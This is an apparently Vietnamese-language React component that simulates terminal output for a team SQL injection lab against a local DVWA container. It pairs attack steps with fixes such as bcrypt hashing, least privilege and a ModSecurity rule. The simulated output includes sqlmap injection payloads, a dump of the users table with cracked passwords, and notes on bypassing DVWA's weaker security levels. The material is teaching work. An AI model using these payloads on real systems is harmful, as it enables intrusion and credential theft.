"use client";

import { useState } from "react";
import { CheckCircle2, ChevronDown, ChevronUp, Play, RotateCcw, ShieldAlert, ShieldCheck, Terminal } from "lucide-react";
import { WindowControls } from "@/components/WindowBar";
import { ScenarioStep } from "@/types/scenario";

interface StepInlineRunnerProps {
  step: ScenarioStep;
  memberNumber: 1 | 2 | 3 | 4;
  variables: {
    container: string;
    phpsessid: string;
    userToken: string;
  };
  isCompleted: boolean;
  onToggleComplete: () => void;
  onOpenAdvancedSim?: (simKey?: string) => void;
}

export function StepInlineRunner({
  step,
  memberNumber,
  variables,
  isCompleted,
  onToggleComplete,
  onOpenAdvancedSim,
}: StepInlineRunnerProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [isRunning, setIsRunning] = useState(false);
  const [hasRun, setHasRun] = useState(false);
  const [copied, setCopied] = useState(false);

  const container = variables.container.trim() || (memberNumber === 1 ? "215d3a734374" : "dvwa");
  const sess = variables.phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";
  const token = variables.userToken.trim() || "d41d8cd98f00b204e9800998ecf8427e";

  const hostPrompt =
    memberNumber === 1
      ? "soncris@macbook-pro:~ %"
      : memberNumber === 2
      ? "hung@ubuntu-vm:~$ "
      : memberNumber === 3
      ? "quyet@ubuntu-vm:~$ "
      : "khanh@ubuntu-vm:~$ ";

  // Compute live command
  const primaryCmd = step.commands[0]?.template ?? "";
  const interpolatedCmd = primaryCmd
    .replace(/<CONTAINER_ID>/g, container)
    .replace(/<Container_ID>/g, container)
    .replace(/<Mã_Session>/g, sess)
    .replace(/<PHPSESSID>/g, sess)
    .replace(/<USER_TOKEN>/g, token);

  // Compute live simulated output
  const getSimulatedStream = () => {
    switch (step.id) {
      // SƠN (1)
      case "m1-s1":
        return `[+] Khởi tạo kết nối Docker daemon...\n[+] Quét socket /var/run/docker.sock: OK\n\nCONTAINER ID   IMAGE                  COMMAND      STATUS       PORTS                    NAMES\n${container.padEnd(14, " ")} vulnerables/web-dvwa   "/main.sh"   Up 2 hours   0.0.0.0:8080->80/tcp     dvwa_lab\n\n[+] Bắt đầu quét dịch vụ Nmap (127.0.0.1:8080)...\nStarting Nmap 7.95 ( https://nmap.org )\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00024s latency).\n\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache httpd 2.4.25 ((Debian))\n\nService detection performed. 1 service recognized.`;
      
      case "m1-s2":
        return `[+] Gửi HTTP GET request tới http://127.0.0.1:8080/login.php...\n\nHTTP/1.1 200 OK\nDate: Mon, 16 Nov 2026 09:20:00 GMT\nServer: Apache/2.4.25 (Debian)   <-- [CWE-200: Lộ phiên bản]\nX-Powered-By: PHP/7.0.33\nSet-Cookie: PHPSESSID=${sess}; path=/   <-- [CWE-614: Thiếu HttpOnly]\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\nCache-Control: no-cache, must-revalidate\nPragma: no-cache\nSet-Cookie: security=low   <-- [Thiếu SameSite=Strict]\nContent-Type: text/html;charset=utf-8\n\n[!] KẾT LUẬN TRINH SÁT: Phát hiện 2 điểm yếu hạ tầng (CWE-200 Server Banner & CWE-614 Cookie Flags).`;

      case "m1-s3":
        return `[+] Thực thi ghi file cấu hình bảo mật vào container ${container}...\ncat << 'EOF' >> /etc/apache2/conf-available/security.conf\nServerTokens Prod\nServerSignature Off\nEOF\n\n[+] Kích hoạt cấu hình: a2enconf security\nEnabling conf security.\nTo activate the new configuration, you need to run:\n  service apache2 reload\n\n[+] Tải lại dịch vụ: service apache2 reload\n[ ok ] Reloading web server: apache2.\n\n[+] Kiểm chứng lại HTTP Header qua cURL:\nHTTP/1.1 200 OK\nServer: Apache   <-- [ĐÃ ẨN HOÀN TOÀN '2.4.25 (Debian)']\n\n[✓] Live Patching thành công! Đã triệt tiêu bề mặt tấn công CWE-200.`;

      // HÙNG (2)
      case "m2-s1":
        return `[+] Kiểm tra Burp Suite Proxy Listener tại 127.0.0.1:8081: ĐANG LẮNG NGHE\n[+] Kiểm tra giải pháp Loopback Bypass: localtest.me:8080 -> 127.0.0.1:8080: OK\n[+] Gói tin GET /vulnerabilities/sqli/?id=1&Submit=Submit đã được bắt giữ.\n\n[HTTP Intercept Preview]:\nGET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\nHost: localtest.me:8080\nCookie: security=low; PHPSESSID=${sess}\nUser-Agent: Mozilla/5.0 (Burp Suite Chromium)\n\n[+] Chuyển gói tin thành công sang tab Burp Repeater (phím tắt Ctrl+R).`;

      case "m2-s2":
        return `[+] Gửi payload id = 1' qua Burp Repeater tới http://localtest.me:8080...\n[+] Nhận phản hồi HTTP/1.1 200 OK (18ms, 1,842 bytes):\n\n<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''1''' at line 1</pre>\n\n[!] PHÂN TÍCH LỖ HỔNG: Ký tự nháy đơn phá vỡ cấu trúc câu lệnh SQL MariaDB.\n-> Xác nhận lỗ hổng Error-based SQL Injection (CWE-89, CVSS 8.8).`;

      case "m2-s3":
        return `[+] Thực thi lệnh curl với cookie phiên:\n$ curl -s -b "security=low; PHPSESSID=${sess}" "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -o "First name: [^<]*"\n\nFirst name: admin\nFirst name: Gordon\n\n[✓] Trích xuất tự động thành công dữ liệu First name ngay trên dòng lệnh Linux!`;

      case "m2-s4":
        return `[+] Đọc nhật ký web server container ${container} qua lệnh grep:\n$ docker exec ${container} grep -E "(\\%27|\\'|UNION|SELECT)" /var/log/apache2/access.log | tail -n 5\n\n172.17.0.1 - - [16/Nov/2026:09:12:44 +0000] "GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Burp Chromium)"\n172.17.0.1 - - [16/Nov/2026:09:14:02 +0000] "GET /vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit HTTP/1.1" 200 2195 "-" "curl/8.5.0"\n172.17.0.1 - - [16/Nov/2026:09:16:11 +0000] "GET /vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,password%20FROM%20users&Submit=Submit HTTP/1.1" 200 2340 "-" "sqlmap/1.8.4"\n\n[✓] Blue Team Log Forensics: Phát hiện đầy đủ IoC (IP nguồn, ký tự %27, OR '1'='1 và User-Agent sqlmap).`;

      // QUYẾT (3)
      case "m3-s1":
        return `[+] Khởi chạy SQLMap kiểm tra tham số 'id'...\n[INFO] testing connection to the target URL\n[INFO] checking if the target is protected by some kind of WAF/IPS\n[INFO] testing if the target URL content is stable\n[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others? [y/N] N\nsqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:\n---
Parameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1' AND 3154=3154 AND 'sMsm'='sMsm&Submit=Submit\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1' AND (SELECT 6742 FROM(SELECT COUNT(*),CONCAT(0x717a787871,(SELECT (ELT(6742=6742,1))),0x7171787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'fQhT'='fQhT&Submit=Submit\n---
[INFO] the back-end DBMS is MySQL (MariaDB fork)\navailable databases [2]:\n[*] dvwa\n[*] information_schema\n\n[✓] Lệnh 1 hoàn tất: Đã định danh 2 CSDL mục tiêu.`;

      case "m3-s2":
        return `[+] Khởi chạy SQLMap liệt kê các bảng trong CSDL 'dvwa'...\n[INFO] fetching tables for database: 'dvwa'\nDatabase: dvwa\n[2 tables]\n+-----------+\n| guestbook |\n| users     |\n+-----------+\n\n[✓] Lệnh 2 hoàn tất: Tìm thấy bảng dữ liệu nhạy cảm 'users' (5 bản ghi).`;

      case "m3-s3":
        return `[+] Khởi chạy SQLMap trích xuất bảng 'users' và giải mã băm MD5...\n[INFO] fetching columns for table 'users' in database 'dvwa'\n[INFO] fetching entries for table 'users' in database 'dvwa'\n[INFO] recognizing possible password hashes in column 'password'\n[INFO] using dictionary '/usr/share/sqlmap/data/txt/wordlist.tx_'\n[INFO] cracking password hashes with rainbow tables...\n[100%] [████████████████████████████████] 5/5 hashes cracked\n\nDatabase: dvwa\nTable: users\n+---------+--------+----------------------------------+----------+\n| user_id | user   | password (MD5)                   | cleartext|\n+---------+--------+----------------------------------+----------+\n| 1       | admin  | 5f4dcc3b5aa765d61d8327deb882cf99 | password |\n| 2       | gordonb| e99a18c428cb38d5f260853678922e03 | abc123   |\n| 3       | 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b | charley  |\n| 4       | pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein  |\n| 5       | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |\n+---------+--------+----------------------------------+----------+\n[✓] Lệnh 3 hoàn tất: Đã dump toàn bộ 5 tài khoản và crack thành công mật khẩu cleartext.`;

      case "m3-s4":
        return `[+] Kết nối MariaDB CLI hộp trắng trong container ${container}:\n$ docker exec -it ${container} mysql -u root -e "USE dvwa; SELECT user_id, user, password FROM users;"\n\n+---------+--------+----------------------------------+\n| user_id | user   | password                         |\n+---------+--------+----------------------------------+\n|       1 | admin  | 5f4dcc3b5aa765d61d8327deb882cf99 |\n|       2 | gordonb| e99a18c428cb38d5f260853678922e03 |\n|       3 | 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b |\n|       4 | pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7 |\n|       5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+---------+--------+----------------------------------+\n\n[!] BẰNG CHỨNG HỘP TRẮNG: user 1 (admin) và user 5 (smithy) có CHUNG chuỗi băm 32 ký tự MD5.\n-> Khẳng định lỗi lưu mật khẩu không có Muối (CWE-759: Use of a One-Way Hash without a Salt, CVSS 4.9).`;

      case "m3-s5":
        return `[+] THỰC THI VÁ LỖI 1: Băm Bcrypt (cost=12) qua PHP CLI:\n$ docker exec -it ${container} php -r 'echo password_hash("password", PASSWORD_BCRYPT, ["cost" => 12]) . PHP_EOL;'\n-> $2y$12$e8iL7.54oPn3B5xZ8mYgzeW8oZkE4a1LqE3mJ4/8uHk7nF6/0xG7m\n\n$ docker exec -it ${container} mysql -u root -e "USE dvwa; UPDATE users SET password = '\$2y\$12\$e8iL7.54oPn3B5xZ8mYgzeW8oZkE4a1LqE3mJ4/8uHk7nF6/0xG7m' WHERE user_id = 1;"\nQuery OK, 1 row affected (0.01 sec)\n\n[+] THỰC THI VÁ LỖI 2: Tạo tài khoản Least Privilege 'dvwa_svc' thay cho root:\nCREATE USER 'dvwa_svc'@'%' IDENTIFIED BY 'StrongServicePass123!';\nGRANT SELECT, INSERT, UPDATE ON dvwa.* TO 'dvwa_svc'@'%';\nFLUSH PRIVILEGES;\nQuery OK, 0 rows affected (0.00 sec)\n\n[✓] Hoàn tất 2 bản vá: Triệt tiêu Rainbow Table (CWE-759) và chặn đứng leo thang đặc quyền CSDL (CWE-250).`;

      // KHÁNH (4)
      case "m4-s1":
        return `[+] Đọc trực tiếp 4 file PHP mã nguồn trong container ${container}:\n\n=== 1. low.php ===\nLine 9: $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";\n-> LỖI NGUYÊN GỐC: Nối chuỗi trực tiếp '$id', không kiểm tra kiểu dữ liệu, không thoát ký tự.\n\n=== 2. medium.php ===\nLine 8: $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);\nLine 9: $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";\n-> BYPASS: user_id là kiểu SỐ (không có nháy đơn), mysqli_real_escape_string không chặn khoảng trắng hoặc UNION!\n\n=== 3. high.php ===\nLine 11: $id = stripslashes( $id );\nLine 12: $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";\n-> BYPASS: Ký tự chú thích (# hoặc -- -) cắt bỏ mệnh đề LIMIT 1; stripslashes không bảo vệ được SQL.\n\n=== 4. impossible.php (CHUẨN OWASP) ===\nLine 5:  checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\nLine 11: if( is_numeric( $id ) ) {\nLine 13:   $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' );\nLine 14:   $data->bindParam( ':id', $id, PDO::PARAM_INT );\nLine 15:   $data->execute();\n}\n[✓] 3 lớp phòng thủ toàn diện: Anti-CSRF Token -> Ép kiểu is_numeric() -> PDO Parameter Binding.`;

      case "m4-s2":
        return `[+] Thử nghiệm PoC 5 gốc (Gửi id=1' KHÔNG CÓ user_token):\nHTTP/1.1 302 Found\nLocation: index.php\nContent-Length: 0\n-> Bị chặn ngay tại Dòng 5 (checkToken fail) do thiếu CSRF Token!\n\n[+] Thử nghiệm PoC 5 tinh chỉnh (Gửi id=1' KÈM user_token=${token}):\nHTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n<!-- Trang HTML hợp lệ, 0 bản ghi, KHÔNG lộ lỗi SQL cú pháp -->\n-> Vượt qua checkToken dòng 5, nhưng bị chặn bởi is_numeric("1'") ở dòng 11 và PDO bindParam.\n\n[✓] Chứng minh thành công: Bản vá impossible.php bảo vệ tuyệt đối trước SQL Injection.`;

      case "m4-s3":
        return `[+] Khởi chạy kiểm thử luật WAF ModSecurity CRS (OWASP A03:2021)...\nSecRule ARGS "@rx ('|--|#|\\/\\*|UNION|SELECT|OR\\s+\\d+=\\d+)" \\\n  "id:1001,phase:2,deny,status:403,log,msg:'ModSecurity: SQL Injection Attack Detected (CRS-942100)'"\n\n[+] Gửi HTTP Request mang payload độc hại: ?id=1' OR 1=1\nHTTP/1.1 403 Forbidden\nServer: Apache/ModSecurity\nContent-Type: text/html; charset=UTF-8\n\n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head><title>403 Forbidden</title></head>\n<body><h1>Forbidden</h1><p>You don't have permission to access this resource on this server.</p></body></html>\n\n[✓] WAF chặn đứng cuộc tấn công ngay ở tầng biên trước khi gói tin chạm tới tầng ứng dụng PHP!`;

      default:
        return step.expected_output || "[+] Lệnh đã chạy thành công trong môi trường mô phỏng.";
    }
  };

  const handleRun = () => {
    setIsRunning(true);
    setTimeout(() => {
      setIsRunning(false);
      setHasRun(true);
    }, 600);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(interpolatedCmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="mt-3 rounded-lg border border-hairline bg-surface overflow-hidden">
      {/* Toggle Bar */}
      <div className="flex flex-wrap items-center justify-between gap-2 px-3.5 py-2.5 bg-subtle/70">
        <button
          type="button"
          onClick={() => setIsOpen(!isOpen)}
          className="inline-flex cursor-pointer items-center gap-2 text-xs font-semibold text-ink transition-colors hover:text-accent"
        >
          <Terminal className="h-4 w-4 text-accent" aria-hidden="true" />
          <span>Mô phỏng Trực quan Bước 0{step.step_order}</span>
          {hasRun && (
            <span className="rounded bg-emerald-500/15 px-1.5 py-0.5 text-[10px] font-bold text-emerald-600 dark:text-emerald-400">
              ĐÃ CHẠY
            </span>
          )}
          {isOpen ? (
            <ChevronUp className="h-3.5 w-3.5 text-muted" aria-hidden="true" />
          ) : (
            <ChevronDown className="h-3.5 w-3.5 text-muted" aria-hidden="true" />
          )}
        </button>

        <div className="flex items-center gap-2">
          {!isOpen && (
            <button
              type="button"
              onClick={() => {
                setIsOpen(true);
                handleRun();
              }}
              className="inline-flex cursor-pointer items-center gap-1.5 rounded bg-ink px-2.5 py-1 text-xs font-semibold text-canvas transition-opacity hover:opacity-90"
            >
              <Play className="h-3 w-3" aria-hidden="true" />
              Chạy thử ngay
            </button>
          )}

          {step.simulator_key && onOpenAdvancedSim && (
            <button
              type="button"
              onClick={() => onOpenAdvancedSim(step.simulator_key)}
              className="inline-flex cursor-pointer items-center gap-1 text-[11px] font-medium text-muted hover:text-ink"
              title="Mở bộ mô phỏng nâng cao ở cuối trang"
            >
              Bảng điều khiển ↗
            </button>
          )}
        </div>
      </div>

      {/* Terminal Body */}
      {isOpen && (
        <div className="p-3.5 space-y-3 bg-[#0a0d12] border-t border-hairline text-zinc-200 font-mono text-xs">
          {/* Terminal Window Header */}
          <div className="flex items-center justify-between border-b border-zinc-800 pb-2">
            <div className="flex items-center gap-2.5">
              <WindowControls />
              <span className="text-[11px] text-zinc-300 font-mono">
                {hostPrompt}
              </span>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={handleCopy}
                className="cursor-pointer rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[11px] text-zinc-300 transition-colors hover:bg-zinc-700"
              >
                {copied ? "Đã copy" : "Copy lệnh"}
              </button>
              <button
                type="button"
                onClick={handleRun}
                disabled={isRunning}
                className="cursor-pointer inline-flex items-center gap-1 rounded bg-emerald-600 px-2.5 py-0.5 text-[11px] font-bold text-white transition-opacity hover:opacity-90 disabled:opacity-50"
              >
                {isRunning ? (
                  <>Đang chạy...</>
                ) : (
                  <>
                    <Play className="h-3 w-3" aria-hidden="true" /> Chạy lệnh
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Command Executed */}
          <div className="text-zinc-400">
            <span className="text-emerald-400">{hostPrompt}</span>{" "}
            <span className="text-zinc-100 font-semibold">{interpolatedCmd.split("\n")[0]}</span>
            {interpolatedCmd.split("\n").length > 1 && (
              <span className="text-zinc-500"> (+{interpolatedCmd.split("\n").length - 1} dòng)</span>
            )}
          </div>

          {/* Terminal Stream Output */}
          <div className="min-h-[140px] max-h-[320px] overflow-y-auto rounded bg-[#05070a] p-3 text-zinc-300 border border-zinc-800/80">
            {isRunning ? (
              <div className="flex items-center gap-2 text-amber-400">
                <span className="inline-block animate-spin">⚡</span>
                <span>Đang kết nối mục tiêu 127.0.0.1:8080 &amp; thực thi lệnh...</span>
              </div>
            ) : hasRun ? (
              <pre className="whitespace-pre-wrap leading-relaxed text-emerald-300/90 selection:bg-emerald-800 selection:text-white">
                {getSimulatedStream()}
              </pre>
            ) : (
              <div className="text-zinc-500 flex flex-col items-center justify-center py-6 text-center">
                <Terminal className="h-6 w-6 mb-1 opacity-50" />
                <span>Bấm nút <strong>&quot;Chạy lệnh&quot;</strong> để xem quá trình mô phỏng thực tế.</span>
                <span className="text-[11px] text-zinc-600 mt-1">Các tham số môi trường ({container}, {sess.slice(0, 8)}...) được tự động nạp.</span>
              </div>
            )}
          </div>

          {/* Bottom Action Footer */}
          {hasRun && (
            <div className="flex flex-wrap items-center justify-between gap-2 border-t border-zinc-800/80 pt-2.5 font-sans">
              <div className="flex items-center gap-2 text-xs">
                {step.is_defense ? (
                  <ShieldCheck className="h-4 w-4 text-emerald-400" />
                ) : (
                  <ShieldAlert className="h-4 w-4 text-amber-400" />
                )}
                <span className="text-zinc-300">
                  {step.is_defense ? "Gia cố phòng thủ thành công." : "Đã xác nhận kết quả kiểm thử."}
                </span>
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={handleRun}
                  className="cursor-pointer inline-flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-2.5 py-1 text-xs text-zinc-300 hover:bg-zinc-700"
                >
                  <RotateCcw className="h-3 w-3" /> Chạy lại
                </button>

                <button
                  type="button"
                  onClick={onToggleComplete}
                  className={`cursor-pointer inline-flex items-center gap-1.5 rounded px-3 py-1 text-xs font-semibold transition-colors ${
                    isCompleted
                      ? "bg-zinc-800 text-emerald-400 border border-emerald-500/30"
                      : "bg-emerald-600 text-white hover:bg-emerald-700"
                  }`}
                >
                  <CheckCircle2 className="h-3.5 w-3.5" />
                  {isCompleted ? "Đã đánh dấu xong" : "Đánh dấu hoàn thành bước"}
                </button>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
